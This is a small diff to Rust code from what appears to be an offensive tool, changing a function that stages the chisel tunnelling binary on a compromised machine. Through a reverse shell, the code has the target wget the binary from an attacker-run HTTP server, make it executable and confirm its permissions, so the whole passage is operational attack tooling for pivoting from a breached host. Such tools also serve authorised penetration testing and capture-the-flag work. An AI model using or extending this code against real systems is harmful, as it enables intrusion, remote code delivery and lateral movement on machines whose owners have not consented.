@@ -272,7 +272,7 @@ async fn stage_chisel_client(shell: &mut ReverseShell, path: path::PathBuf, lhos
     let mut http_server = SimpleHTTPServer::new(net::SocketAddr::new(lhost.clone(), lport));
     http_server.serve(path.parent().unwrap());
 
-    shell.exec(&format!("/usr/bin/wget -q http://{}:{}/{}", lhost, lport, path.file_name().unwrap().to_str().unwrap()))?;
+    shell.exec(&format!("/usr/bin/wget -q http://{}:{}/{} -O ./chisel", lhost, lport, path.file_name().unwrap().to_str().unwrap()))?;
     shell.exec("chmod +x ./chisel")?;
     let output = shell.exec("ls -l ./chisel")?;
     if !output.contains("rwxrwxr-x") {
